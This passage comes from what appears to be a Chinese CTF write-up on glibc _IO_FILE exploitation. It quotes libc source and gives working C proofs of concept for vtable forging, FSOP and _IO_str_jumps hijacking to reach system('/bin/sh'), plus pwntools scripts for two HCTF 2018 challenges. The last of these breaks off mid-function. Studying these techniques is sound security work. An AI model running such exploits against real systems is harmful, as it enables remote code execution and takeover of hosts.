fp-&gt;_fileno = -1;  fp-&gt;_offset = _IO_pos_BAD;  return close_status ? close_status : write_status;}...#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)...# define _IO_new_file_finish _IO_file_finish...void_IO_new_file_finish (_IO_FILE *fp, int dummy){  if (_IO_file_is_open (fp))    {      _IO_do_flush (fp);      if (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))    _IO_SYSCLOSE (fp);    }  _IO_default_finish (fp, 0);}</code></pre><h1 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h1><h2 id="Forge-Vtable-to-Control-PC"><a href="#Forge-Vtable-to-Control-PC" class="headerlink" title="Forge Vtable to Control PC"></a>Forge Vtable to Control PC</h2><p>伪造 vtable 劫持程序流程的中心思想就是针对 <code>_IO_FILE_plus</code> 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。因此 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。直接修改 vtable 的方法测试了一下在 glibc-2.19 也不能成功，测试程序的 vtable 正好落在 libc 的数据段上，是只读的：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define system_ptr 0x00007ffff7a0d000+0x45390int main() {    FILE *fp;    uint64_t *vtable_ptr;    fp = fopen(&quot;1.txt&quot;, &quot;rw&quot;);    if (!fp) {        printf(&quot;file not existed.\n&quot;);        exit(-1);    }    vtable_ptr = *(uint64_t *)((uint64_t)fp + 0xd8);    memcpy(fp, &quot;sh&quot;, 3);    vtable_ptr[7] = system_ptr; // __xsputn    fwrite(&quot;X&quot;, 1, 1, fp);    return 0;}</code></pre><p>在可控区域伪造一个 vtable 来替换原来的 vtable 是可行的：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define system_ptr 0x00007ffff7a0d000+0x45390int main() {    FILE *fp;    uint64_t *vtable_addr, *fake_vtable;    fp = fopen(&quot;1.txt&quot;, &quot;rw&quot;);    if (!fp) {        printf(&quot;file not existed.\n&quot;);        exit(-1);    }    fake_vtable = malloc(0x40);    vtable_addr = (uint64_t *)((uint64_t)fp + 0xd8);    vtable_addr[0] = (uint64_t)fake_vtable;    memcpy(fp, &quot;sh&quot;, 3);    fake_vtable[7] = system_ptr; // __xsputn    fwrite(&quot;X&quot;, 1, 1, fp);    return 0;}</code></pre><h2 id="File-Stream-Oriented-Programming（FSOP）"><a href="#File-Stream-Oriented-Programming（FSOP）" class="headerlink" title="File Stream Oriented Programming（FSOP）"></a>File Stream Oriented Programming（FSOP）</h2><p>FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的 <code>_IO_FILE</code> 结构会使用 <code>_chain</code> 域相互连接形成一个链表，这个链表的头部由 <code>_IO_list_all</code> 维护。FSOP 的核心思想就是劫持 <code>_IO_list_all</code> 的值来伪造链表和其中的 <code>_IO_FILE</code> 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用 <code>_IO_flush_all_lockp</code>，这个函数会刷新 <code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用 <code>_IO_FILE_plus.vtable</code> 中的 <code>_IO_overflow</code>。</p><pre><code class="cpp">int_IO_flush_all_lockp (int do_lock){  int result = 0;  struct _IO_FILE *fp;  int last_stamp;#ifdef _IO_MTSAFE_IO  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);  if (do_lock)    _IO_lock_lock (list_all_lock);#endif  last_stamp = _IO_list_all_stamp;  fp = (_IO_FILE *) _IO_list_all;  while (fp != NULL)    {      run_fp = fp;      if (do_lock)    _IO_flockfile (fp);      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T       || (_IO_vtable_offset (fp) == 0           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif       )      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)    result = EOF;      if (do_lock)    _IO_funlockfile (fp);      run_fp = NULL;      if (last_stamp != _IO_list_all_stamp)    {      /* Something was added to the list.  Start all over again.  */      fp = (_IO_FILE *) _IO_list_all;      last_stamp = _IO_list_all_stamp;    }      else    fp = fp-&gt;_chain;    }#ifdef _IO_MTSAFE_IO  if (do_lock)    _IO_lock_unlock (list_all_lock);  __libc_cleanup_region_end (0);#endif  return result;}</code></pre><p><code>_IO_flush_all_lockp</code> 函数不需要手动调用，在一些情况下这个函数会被系统调用：</p><ul><li>当 libc 执行 abort 流程时</li><li>当执行 <code>exit</code> 函数时</li><li>当执行流从 <code>main</code> 函数返回时</li></ul><p><code>_IO_list_all</code> 作为 libc 中的全局变量，需要获取 libc 基址才能得到 <code>_IO_list_all</code> 的地址。要实现 FSOP，还需要使构造的 FILE 能够正常工作，也就是需要 <code>fp-&gt;_mode</code> 的值为 0，<code>fp-&gt;_IO_write_ptr</code> 要大于 <code>fp-&gt;_IO_write_base</code>：</p><pre><code class="cpp">if ((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)    result = EOF;</code></pre><p>伪造 <code>_IO_list_all</code> 和 <code>vtable</code>，最后 <code>exit</code> 时会 Call 到构造的 <code>_IO_overflow</code> 上：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#define _IO_list_all 0x7ffff7dd2520#define mode_offset 0xc0#define write_ptr_offset 0x28#define write_base_offset 0x20#define vtable_offset 0xd8#define one_gadget 0x7ffff7a0d000+0xf02a4int main() {    void *ptr, *fake_vtable;    uint64_t *list_all_ptr;    ptr = malloc(0x200);    fake_vtable = (uint64_t)ptr + 0x100;    *(uint64_t *)((uint64_t)ptr + mode_offset) = 0;    *(uint64_t *)((uint64_t)ptr + write_ptr_offset) = 1;    *(uint64_t *)((uint64_t)ptr + write_base_offset) = 0;    *(uint64_t *)((uint64_t)ptr + vtable_offset) = (uint64_t)ptr + 0x100;    *(uint64_t *)((uint64_t)fake_vtable + 0x18) = one_gadget;    list_all_ptr = (uint64_t *)_IO_list_all;    list_all_ptr[0] = ptr;    exit(0);}</code></pre><h2 id="Attack-with-IO-FILE-gt-glibc-2-24"><a href="#Attack-with-IO-FILE-gt-glibc-2-24" class="headerlink" title="Attack with IO_FILE &gt;= glibc-2.24"></a>Attack with IO_FILE &gt;= glibc-2.24</h2><p>从 glibc-2.24 起，加入了针对 <code>_IO_FILE_plus-&gt;vtable</code> 的检查，在调用虚函数时会首先检查 vtable 地址的合法性。先验证 vtable 是否在 <code>_IO_vtable</code> 段中，如果满足条件就正常执行；否则调用 <code>_IO_vtable_check</code> 进一步检查。具体验证通过计算 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 的值 <code>section_length</code>，然后获取 vtable 到 <code>__start___libc_IO_vtables</code> 的偏移 <code>offset</code>，若 <code>offset</code> 大于等于 <code>section_length</code> 就会调用 <code>_IO_vtable_check</code>：</p><pre><code class="cpp">/* Check if unknown vtable pointers are permitted; otherwise,   terminate the process.  */void _IO_vtable_check (void) attribute_hidden;/* Perform vtable pointer validation.  If validation fails, terminate   the process.  */static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable){  /* Fast path: The vtable pointer is within the __libc_IO_vtables     section.  */  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;  const char *ptr = (const char *) vtable;  uintptr_t offset = ptr - __start___libc_IO_vtables;  if (__glibc_unlikely (offset &gt;= section_length))    /* The vtable pointer is not in the expected section.  Use the       slow path, which will terminate the process if necessary.  */    _IO_vtable_check ();  return vtable;}</code></pre><p>在 <code>_IO_vtable_check</code> 中，会具体检查 vtable 是否合法：</p><pre><code class="cpp">void attribute_hidden_IO_vtable_check (void){#ifdef SHARED  /* Honor the compatibility flag.  */  void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);#ifdef PTR_DEMANGLE  PTR_DEMANGLE (flag);#endif  if (flag == &amp;_IO_vtable_check)    return;  /* In case this libc copy is in a non-default namespace, we always     need to accept foreign vtables because there is always a     possibility that FILE * objects are passed across the linking     boundary.  */  {    Dl_info di;    struct link_map *l;    if (!rtld_active ()        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))      return;  }#else /* !SHARED */  /* We cannot perform vtable validation in the static dlopen case     because FILE * handles might be passed back and forth across the     boundary.  Therefore, we disable checking in this case.  */  if (__dlopen != NULL)    return;#endif  __libc_fatal (&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;);}</code></pre><h3 id="Exploit-with-FILENO"><a href="#Exploit-with-FILENO" class="headerlink" title="Exploit with FILENO"></a>Exploit with FILENO</h3><p>当 vtable 不能被利用了，那么就该想办法在 <code>_IO_FILE</code> 结构体找利用方法。<code>_IO_FILE</code> 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 <code>fwrite</code>、<code>fread</code> 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。因为进程中包含了系统默认的三个文件流 stdin、stdout、stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf、printf 一样可以进行利用。在 <code>_IO_FILE</code> 中 <code>_IO_buf_base</code> 表示操作的起始地址，<code>_IO_buf_end</code> 表示结束地址，通过控制这两个数据可以实现控制读写的操作：</p><pre><code class="cpp">struct _IO_FILE {  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags  /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;    /* Current read pointer */  char* _IO_read_end;    /* End of get area. */  char* _IO_read_base;    /* Start of putback+get area. */  char* _IO_write_base;    /* Start of put area. */  char* _IO_write_ptr;    /* Current put pointer. */  char* _IO_write_end;    /* End of put area. */  char* _IO_buf_base;    /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */#define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  /*  char* _save_gptr;  char* _save_egptr; */  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE};</code></pre><p>在没有执行任何输出函数之前，<code>_IO_2_1_stdin_</code> 结构体如下：</p><pre><code>pwndbg&gt; p/x _IO_2_1_stdin_$1 = {  file = {    _flags = 0xfbad2088,    _IO_read_ptr = 0x0,    _IO_read_end = 0x0,    _IO_read_base = 0x0,    _IO_write_base = 0x0,    _IO_write_ptr = 0x0,    _IO_write_end = 0x0,    _IO_buf_base = 0x0,    _IO_buf_end = 0x0,    _IO_save_base = 0x0,    _IO_backup_base = 0x0,    _IO_save_end = 0x0,    _markers = 0x0,    _chain = 0x0,    _fileno = 0x0,    _flags2 = 0x0,    _old_offset = 0xffffffffffffffff,    _cur_column = 0x0,    _vtable_offset = 0x0,    _shortbuf = {0x0},    _lock = 0x7ffff7dd3790,    _offset = 0xffffffffffffffff,    _codecvt = 0x0,    _wide_data = 0x7ffff7dd19c0,    _freeres_list = 0x0,    _freeres_buf = 0x0,    __pad5 = 0x0,    _mode = 0x0,    _unused2 = {0x0 &lt;repeats 20 times&gt;}  },  vtable = 0x7ffff7dd06e0}</code></pre><p>调用 <code>scanf</code> 之类的函数后可以看到 <code>_IO_read_ptr</code>、<code>_IO_read_base</code>、<code>_IO_read_end</code>、<code>_IO_buf_base</code>、<code>_IO_buf_end</code> 等域都被初始化。而且可以看出来初始化后的内存是在堆上分配的，可以看到输入的数据，且大小是 0x400 个字节，正好是 <code>_IO_buf_base</code> 到 <code>_IO_buf_end</code> 的大小：</p><pre><code>pwndbg&gt; p/x _IO_2_1_stdin_$2 = {  file = {    _flags = 0xfbad2288,    _IO_read_ptr = 0x602013,    _IO_read_end = 0x602014,    _IO_read_base = 0x602010,    _IO_write_base = 0x602010,    _IO_write_ptr = 0x602010,    _IO_write_end = 0x602010,    _IO_buf_base = 0x602010,    _IO_buf_end = 0x602410,    _IO_save_base = 0x0,    _IO_backup_base = 0x0,    _IO_save_end = 0x0,    _markers = 0x0,    _chain = 0x0,    _fileno = 0x0,    _flags2 = 0x0,    _old_offset = 0xffffffffffffffff,    _cur_column = 0x0,    _vtable_offset = 0x0,    _shortbuf = {0x0},    _lock = 0x7ffff7dd3790,    _offset = 0xffffffffffffffff,    _codecvt = 0x0,    _wide_data = 0x7ffff7dd19c0,    _freeres_list = 0x0,    _freeres_buf = 0x0,    __pad5 = 0x0,    _mode = 0xffffffff,    _unused2 = {0x0 &lt;repeats 20 times&gt;}  },  vtable = 0x7ffff7dd06e0}pwndbg&gt; x/10gx 0x6020000x602000:    0x0000000000000000    0x00000000000004110x602010:    0x000000000a333231    0x00000000000000000x602020:    0x0000000000000000    0x00000000000000000x602030:    0x0000000000000000    0x00000000000000000x602040:    0x0000000000000000    0x0000000000000000</code></pre><p>那么如果修改 <code>_IO_buf_base</code> 和 <code>_IO_buf_end</code> 到某个目标地址地址，就能修改掉目标地址的数据：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#define _IO_2_1_stdin_addr 0x7ffff7dd18e0char buf[100] = &quot;This is the Original Buffer.&quot;;int main() {    char stack_buf[100];    void *fake_buf_base = (uint64_t)buf;    void *fake_buf_end = (uint64_t)buf + 100;    void *ptr = _IO_2_1_stdin_addr;    *(uint64_t *)((uint64_t)ptr + 0x38) = fake_buf_base;    *(uint64_t *)((uint64_t)ptr + 0x40) = fake_buf_end;    scanf(&quot;%s&quot;, stack_buf);    printf(&quot;%s\n&quot;, buf);    return 0;}</code></pre><h3 id="Hijack-IO-str-jumps（-lt-glibc-2-28）"><a href="#Hijack-IO-str-jumps（-lt-glibc-2-28）" class="headerlink" title="Hijack _IO_str_jumps（&lt;= glibc-2.28）"></a>Hijack <code>_IO_str_jumps</code>（&lt;= glibc-2.28）</h3><p>libc 中不仅仅只有 <code>_IO_file_jumps</code> 这个 vtable，还有一个叫做 <code>_IO_str_jumps</code>。而这个 vtable 不在 check 范围之内。如果我们能设置文件指针的 vtable 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数：</p><pre><code class="cpp">const struct _IO_jump_t _IO_str_jumps libio_vtable ={  JUMP_INIT_DUMMY,  JUMP_INIT(finish, _IO_str_finish),  JUMP_INIT(overflow, _IO_str_overflow),  JUMP_INIT(underflow, _IO_str_underflow),  JUMP_INIT(uflow, _IO_default_uflow),  JUMP_INIT(pbackfail, _IO_str_pbackfail),  JUMP_INIT(xsputn, _IO_default_xsputn),  JUMP_INIT(xsgetn, _IO_default_xsgetn),  JUMP_INIT(seekoff, _IO_str_seekoff),  JUMP_INIT(seekpos, _IO_default_seekpos),  JUMP_INIT(setbuf, _IO_default_setbuf),  JUMP_INIT(sync, _IO_default_sync),  JUMP_INIT(doallocate, _IO_default_doallocate),  JUMP_INIT(read, _IO_default_read),  JUMP_INIT(write, _IO_default_write),  JUMP_INIT(seek, _IO_default_seek),  JUMP_INIT(close, _IO_default_close),  JUMP_INIT(stat, _IO_default_stat),  JUMP_INIT(showmanyc, _IO_default_showmanyc),  JUMP_INIT(imbue, _IO_default_imbue)};</code></pre><h4 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps-&gt;overflow"></a><code>_IO_str_jumps-&gt;overflow</code></h4><p>在修改了 vtable 之后，可以劫持 <code>_IO_str_overflow</code> 来劫持程序流程：</p><pre><code class="cpp">int_IO_str_overflow (_IO_FILE *fp, int c){  int flush_only = c == EOF;  _IO_size_t pos;  if (fp-&gt;_flags &amp; _IO_NO_WRITES)      return flush_only ? 0 : EOF;  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    {      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;    }  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;  if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))    {      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */    return EOF;      else    {      char *new_buf;      char *old_buf = fp-&gt;_IO_buf_base;      size_t old_blen = _IO_blen (fp);      _IO_size_t new_size = 2 * old_blen + 100;      if (new_size &lt; old_blen)        return EOF;      new_buf        = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);      if (new_buf == NULL)        {          /*      __ferror(fp) = 1; */          return EOF;        }      if (old_buf)        {          memcpy (new_buf, old_buf, old_blen);          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);          /* Make sure _IO_setb won&#39;t try to delete _IO_buf_base. */          fp-&gt;_IO_buf_base = NULL;        }      memset (new_buf + old_blen, &#39;\0&#39;, new_size - old_blen);      _IO_setb (fp, new_buf, new_buf + new_size, 1);      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);      fp-&gt;_IO_write_base = new_buf;      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;    }    }  if (!flush_only)    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;  return c;}</code></pre><p>其中通过以下几个条件来绕过：</p><ol><li><code>fp-&gt;_flags &amp; _IO_NO_WRITES</code> 为假；<ul><li>构造 <code>_flags = 0</code>；</li></ul></li><li><code>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_blen (fp) + flush_only</code> 为真（<code>#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</code>）；<ul><li>构造 <code>_IO_write_base = 0</code>、<code>_IO_write_ptr = 0x7fffffffffffffff</code> 以及 <code>_IO_buf_end = (bin_sh_in_libc_addr - 100) / 2</code>（<code>&amp;&quot;/bin/sh&quot;</code> 需要是一个偶数）；</li></ul></li><li><code>fp-&gt;_flags &amp; _IO_USER_BUF</code> 为假；</li><li><code>2 * _IO_blen (fp) + 100</code> 不能为负数，且指向 <code>&quot;/bin/sh&quot;</code> 字符串对应的地址；</li><li><code>*((_IO_strfile *) fp)-&gt;_s._allocate_buffer</code>（<code>fp + 0xe0</code>）指向 system 地址。</li></ol><p>即最后执行下面这句语句：</p><pre><code class="cpp">      new_buf        = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</code></pre><p>测试代码如下（环境为 glibc-2.24）：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#define libc_base 0x7ffff7a4e000#define _IO_2_1_stdin_addr libc_base+0x3878c0#define _IO_str_jumps_addr libc_base+0x384500#define bin_sh_in_libc_addr libc_base+0x14fc3d#define system_addr libc_base+0x3c971int main() {    FILE *fp;    char *bin_sh_on_stack_addr = &quot;/bin/sh&quot;;    fp = _IO_2_1_stdin_addr;//fopen(&quot;1.txt&quot;, &quot;rw&quot;);    if (!fp) {        printf(&quot;file not existed.\n&quot;);        exit(-1);    }    *(uint64_t *)((uint64_t)fp) = 0; // _flags    *(uint64_t *)((uint64_t)fp + 0x20) = 0; // _IO_write_base    *(uint64_t *)((uint64_t)fp + 0x28) = 0x7fffffffffffffff; // _IO_write_ptr    *(uint64_t *)((uint64_t)fp + 0x40) = ((uint64_t)bin_sh_on_stack_addr - 100) / 2; // _IO_buf_end    *(uint64_t *)((uint64_t)fp + 0xe0) = system_addr;    *(uint64_t *)((uint64_t)fp + 0xd8) = _IO_str_jumps_addr; // vtable    exit(0);}</code></pre><h4 id="IO-str-jumps-gt-finish"><a href="#IO-str-jumps-gt-finish" class="headerlink" title="_IO_str_jumps-&gt;finish"></a><code>_IO_str_jumps-&gt;finish</code></h4><p>同理在 <code>_IO_str_finish</code> 中也可以绕过：</p><pre><code class="cpp">void_IO_str_finish (_IO_FILE *fp, int dummy){  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  fp-&gt;_IO_buf_base = NULL;  _IO_default_finish (fp, 0);}</code></pre><p>绕过条件如下：</p><ol><li><code>fp-&gt;_IO_buf_base</code> 不为空；</li><li><code>fp-&gt;_flags &amp; _IO_USER_BUF</code> 为假；<ul><li>构造 <code>_flags = 0</code>、<code>_IO_buf_base = bin_sh_in_libc_addr</code>；</li></ul></li><li><code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code>（<code>fp + 0xe8</code>）指向 system 地址。</li></ol><p>测试代码如下（环境为 glibc-2.24）：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#define libc_base 0x7ffff7a4e000#define _IO_2_1_stdin_addr libc_base+0x3878c0#define _IO_str_jumps_addr libc_base+0x384500#define bin_sh_in_libc_addr libc_base+0x14fc3d#define system_addr libc_base+0x3c971int main() {    FILE *fp;    fp = _IO_2_1_stdin_addr;//fopen(&quot;1.txt&quot;, &quot;rw&quot;);    if (!fp) {        printf(&quot;file not existed.\n&quot;);        exit(-1);    }    *(uint64_t *)((uint64_t)fp) = 0; // _flags    *(uint64_t *)((uint64_t)fp + 0x38) = bin_sh_in_libc_addr; // _IO_buf_base    *(uint64_t *)((uint64_t)fp + 0xe8) = system_addr;    *(uint64_t *)((uint64_t)fp + 0xd8) = _IO_str_jumps_addr; // vtable    fclose(fp);    return 0;}</code></pre><h1 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018-HCTF-the_end"></a>2018-HCTF-the_end</h1><p>程序除了 Canary 其他保护全开了。一开始给了 libc 基址，然后可以改 5 个字节，最后 exit 退出：</p><pre><code class="cpp">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){  signed int i; // [rsp+4h] [rbp-Ch]  void *buf; // [rsp+8h] [rbp-8h]  sleep(0);  printf(&quot;here is a gift %p, good luck ;)\n&quot;, &amp;sleep);  fflush(_bss_start);  close(1);  close(2);  for ( i = 0; i &lt;= 4; ++i )  {    read(0, &amp;buf, 8uLL);    read(0, buf, 1uLL);  }  exit(1337);}</code></pre><p>因为最后的 exit 会调用到 vtable 中的 setbuf，所以只需要改这个指针就行。方法就是找一个假的 vtable，然后在把对应偏移处的地址改为 one_gadget。又因为只能修改 5 个字节，3 个字节用来修改 one_gadget，2 个字节来改 vtable，所以假的 vtable 原始的高 6 字节要跟原来的一样，而对应的 setbuf 偏移处的值得是一个 libc 上的地址：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./the_end&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]p.recvuntil(&#39;here is a gift &#39;)libc_base = int(p.recv(14)[2:], 16) - libc.symbols[&#39;sleep&#39;]info(&#39;libc_base = &#39; + hex(libc_base))exit = libc_base + libc.symbols[&#39;exit&#39;]one_gadget = libc_base + one_gadgets[1]vtable = libc_base + libc.symbols[&#39;stderr&#39;] - 8info(&#39;vtable = &#39; + hex(vtable))fake_vtable = libc_base + 0x3c5588fake_setbuf = fake_vtable + 0x58#gdb.attach(p)p.recvuntil(&#39;, good luck ;)&#39;)for i in range(2):    p.send(p64(vtable + i))    p.send(p64(fake_vtable)[i])for i in range(3):    p.send(p64(fake_setbuf + i))    p.send(p64(one_gadget)[i])info(&#39;one_gadget = &#39; + hex(one_gadget))p.sendline(&#39;exec /bin/sh 1&gt;&amp;0&#39;)p.interactive()</code></pre><h1 id="2018-HCTF-baby-printf-ver2"><a href="#2018-HCTF-baby-printf-ver2" class="headerlink" title="2018-HCTF-baby_printf_ver2"></a>2018-HCTF-baby_printf_ver2</h1><p>程序除了 Canary 其他保护全开。一开始会提供一个 buffer 的指针。然后往 buffer 上读数据。最后会检查 stdout 的 <code>_flags</code> 字段是否被修改，如果被改了就会再被改回来。最后输出 buffer 中的值：</p><pre><code class="cpp">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  __int64 v3; // r13  FILE *v4; // r14  char buf; // [rsp+3h] [rbp-35h]  int i; // [rsp+4h] [rbp-34h]  unsigned __int64 v7; // [rsp+8h] [rbp-30h]  v7 = __readfsqword(0x28u);  setbuf(stdout, 0LL);  puts(&quot;Welcome to babyprintf_v2.0&quot;);  puts(&quot;heap is too dangrous for printf :(&quot;);  __printf_chk(1LL, (__int64)&quot;So I change the buffer location to %p\n&quot;, (__int64)buffer);  puts(&quot;Have fun!&quot;);  v3 = *(_QWORD *)&amp;stdout[1]._flags;  while ( 1 )  {    i = 0;    while ( 1 )    {      read(0, &amp;buf, 1uLL);      buffer[i] = buf;      if ( buffer[i] == &#39;\n&#39; )        break;      if ( ++i &gt; 0x1ff )        goto LABEL_6;    }    buffer[i] = 0;LABEL_6:    v4 = stdout;    if ( *(_QWORD *)&amp;stdout[1]._flags != v3 )    {      write(1, &quot;rewrite vtable is not permitted!\n&quot;, 0x21uLL);      *(_QWORD *)&amp;v4[1]._flags = v3;    }    __printf_chk(1LL, (__int64)buffer, 0xdeadbeefuLL);  }}</code></pre><p>经过调试发现 buffer 就在 stdout 的前 0x10 的位置。虽然不能修改原来的 stdout，但是我们可以覆盖 stdout 的指针，创建一个新的 stdout 结构体。在调试的时候获取相关的一些结构体成员：</p><pre><code>pwndbg&gt; p/x _IO_2_1_stdout_$1 = {  file = {    _flags = 0xfbad2887,    _IO_read_ptr = 0x7ffff7dd26a3,    _IO_read_end = 0x7ffff7dd26a3,    _IO_read_base = 0x7ffff7dd26a3,    _IO_write_base = 0x7ffff7dd26a3,    _IO_write_ptr = 0x7ffff7dd26a3,    _IO_write_end = 0x7ffff7dd26a3,    _IO_buf_base = 0x7ffff7dd26a3,    _IO_buf_end = 0x7ffff7dd26a4,    _IO_save_base = 0x0,    _IO_backup_base = 0x0,    _IO_save_end = 0x0,    _markers = 0x0,    _chain = 0x7ffff7dd18e0,    _fileno = 0x1,    _flags2 = 0x0,    _old_offset = 0xffffffffffffffff,    _cur_column = 0x0,    _vtable_offset = 0x0,    _shortbuf = {0xa},    _lock = 0x7ffff7dd3780,    _offset = 0xffffffffffffffff,    _codecvt = 0x0,    _wide_data = 0x7ffff7dd17a0,    _freeres_list = 0x0,    _freeres_buf = 0x0,    __pad5 = 0x0,    _mode = 0xffffffff,    _unused2 = {0x0 &lt;repeats 20 times&gt;}  },  vtable = 0x7ffff7dd06e0}</code></pre><p>伪造 stdout 中的成员泄漏 vtable 来获取 libc，然后把 malloc_hook 改成 one_gadget，最后想办法在最后的 printf_chk 处触发 malloc。利用 <a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#FILE-py-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E4%BC%AA%E9%80%A0%E6%A8%A1%E5%9D%97" target="_blank" rel="noopener">veritas501 写的 FILE 模块</a>来构造 <code>_IO_FILE</code> 结构体：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *from FILE import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./babyprintf&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)p.recvuntil(&#39;So I change the buffer location to &#39;)buffer_addr = int(p.recvuntil(&#39;\n&#39;, drop=True)[2:], 16)binary_base = buffer_addr - 0x202010info(&#39;buffer_addr = &#39; + hex(buffer_addr))p.recvuntil(&#39;Have fun!\n&#39;)def leak(addr):    fake_file = IO_FILE_plus_struct()    fake_file._flags = 0x00000000fbad2887    fake_file._IO_read_end = addr    fake_file._IO_write_base = addr    fake_file._IO_write_ptr = addr + 8    fake_file._fileno = 1    fake_file._lock = buffer_addr + 0x100    payload = &#39;A&#39; * 0x10 + p64(buffer_addr + 0x20) + p64(0) + str(fake_file)[:-8]    p.sendline(payload)    p.recvline()    return u64(p.recv(8))def 